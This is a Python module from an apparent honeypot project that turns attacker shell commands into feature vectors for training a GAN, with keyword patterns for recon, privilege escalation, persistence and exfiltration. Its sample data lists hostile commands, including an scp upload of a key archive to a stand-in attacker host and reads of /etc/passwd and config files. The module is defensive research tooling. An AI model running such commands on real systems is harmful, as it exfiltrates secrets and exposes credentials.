from __future__ import annotations

"""
gan/synthetic_data.py — Project Chimera (fixed)

Previously: feature vectors were random noise with no meaning.
Now: each vector encodes real attacker-session properties so the GAN
trains on behaviorally meaningful data and its discriminator can
distinguish real attack sequences from synthetic ones.

Feature vector layout (16 dims, all float32 in [0,1] unless noted):
  0  cmd_length_norm       normalised command length (/ 120)
  1  has_mitre_tag         1.0 if command triggered any MITRE rule
  2  mitre_count_norm      number of unique MITRE tags / 5
  3  is_priv_escalation    1.0 if command contains sudo/su
  4  is_recon              1.0 if command is whoami/id/uname/hostname
  5  is_file_read          1.0 if cat/less/more/head/tail
  6  is_network            1.0 if curl/wget/nmap/netstat/ss
  7  is_persistence        1.0 if cron/crontab/rc.local
  8  is_exfil              1.0 if scp/rsync/ftp/base64
  9  session_depth_norm    position in session (cmd_index / 50)
 10  privilege_level       0.0=user, 0.5=sudo_attempt, 1.0=root
 11  canary_hit            1.0 if this cmd touched a canary file
 12  cmd_entropy_norm      Shannon entropy of command string / 5.0
 13  has_pipe              1.0 if | in command
 14  has_redirect          1.0 if > or >> in command
 15  arg_count_norm        number of space-separated tokens / 10

This representation is used both to build training data from real
sessions and to generate synthetic sessions from the trained generator.
"""

import math
import random
from typing import Any

import numpy as np

from state_engine import tag_mitre

CANARY_FILES = {"/var/www/html/config.php", "/opt/app/config.json",
                "/root/flag.txt", "/opt/backup/keys.tar.gz"}

FEATURE_DIM = 16


def _shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    freq = {}
    for c in s:
        freq[c] = freq.get(c, 0) + 1
    n = len(s)
    return -sum((v / n) * math.log2(v / n) for v in freq.values())


def command_to_feature_vector(
    command: str,
    cmd_index: int = 0,
    privilege_level: str = "user",
) -> np.ndarray:
    """Convert a single real command into a 16-dim float32 feature vector."""
    c = command.strip()
    cl = c.lower()
    tags = tag_mitre(c)

    priv_val = {"user": 0.0, "sudo_attempt": 0.5, "root": 1.0}.get(privilege_level, 0.0)
    if any(x in cl for x in ("sudo", "su -")):
        priv_val = max(priv_val, 0.5)

    canary_hit = float(any(cf in c for cf in CANARY_FILES))

    vec = np.array([
        min(len(c) / 120.0, 1.0),                                   # 0
        1.0 if tags else 0.0,                                        # 1
        min(len({t["id"] for t in tags}) / 5.0, 1.0),               # 2
        1.0 if any(x in cl for x in ("sudo", "su -", "sudo su")) else 0.0,  # 3
        1.0 if any(x in cl for x in ("whoami", "id", "uname", "hostname", "w ")) else 0.0,  # 4
        1.0 if any(x in cl for x in ("cat ", "less ", "more ", "head ", "tail ")) else 0.0,  # 5
        1.0 if any(x in cl for x in ("curl ", "wget ", "nmap", "netstat", "ss -")) else 0.0,  # 6
        1.0 if any(x in cl for x in ("cron", "crontab", "rc.local", "/etc/init")) else 0.0,  # 7
        1.0 if any(x in cl for x in ("scp ", "rsync ", "ftp ", "base64")) else 0.0,          # 8
        min(cmd_index / 50.0, 1.0),                                  # 9
        priv_val,                                                     # 10
        canary_hit,                                                   # 11
        min(_shannon_entropy(c) / 5.0, 1.0),                        # 12
        1.0 if "|" in c else 0.0,                                    # 13
        1.0 if (">" in c or ">>" in c) else 0.0,                    # 14
        min(len(c.split()) / 10.0, 1.0),                             # 15
    ], dtype=np.float32)

    return vec


def session_to_dataset(command_log: list[dict[str, Any]], privilege_level: str = "user") -> np.ndarray:
    """
    Convert a real session's command_log into an (N, 16) float32 matrix.
    Used to feed real attacker data into GAN training.
    """
    rows = []
    for i, entry in enumerate(command_log):
        cmd = entry.get("command", "")
        rows.append(command_to_feature_vector(cmd, cmd_index=i, privilege_level=privilege_level))
    if not rows:
        return build_dataset(n=32)[0]
    return np.stack(rows)


# ── Synthetic baseline dataset (used when no real sessions exist yet) ──────────
_SYNTHETIC_COMMANDS = [
    # recon
    "whoami", "id", "uname -a", "hostname", "w", "who",
    # file hunting
    "ls -la /home/admin", "cat /etc/passwd", "cat /home/admin/notes.txt",
    "cat /var/www/html/config.php", "ls .ssh", "cat /home/admin/.bash_history",
    # privilege escalation
    "sudo su", "sudo -l", "find / -perm -4000 2>/dev/null",
    # network / lateral
    "netstat -tuln", "ss -tuln", "ip a", "curl http://10.0.0.2",
    # persistence
    "crontab -l", "cat /etc/crontab",
    # exfil
    "scp /opt/backup/keys.tar.gz attacker@1.2.3.4:/tmp/",
    "cat /opt/app/config.json | base64",
]


def build_dataset(n: int = 256, dim: int = FEATURE_DIM) -> tuple[np.ndarray, np.ndarray]:
    """
    Build a synthetic training dataset from representative attacker commands.
    Returns (real_data, labels) where labels are all 1.0 (real).
    """
    rows = []
    for i in range(n):
        cmd = random.choice(_SYNTHETIC_COMMANDS)
        # vary session depth and privilege to give the GAN distribution to learn
        idx = random.randint(0, 49)
        priv = random.choice(["user", "user", "user", "sudo_attempt", "root"])
        rows.append(command_to_feature_vector(cmd, cmd_index=idx, privilege_level=priv))
    real = np.stack(rows)
    labels = np.ones((n, 1), dtype=np.float32)
    return real, labels


# Legacy shim so existing imports don't break
def make_feature_vector(dim: int = FEATURE_DIM) -> np.ndarray:
    cmd = random.choice(_SYNTHETIC_COMMANDS)
    return command_to_feature_vector(cmd, cmd_index=random.randint(0, 30))
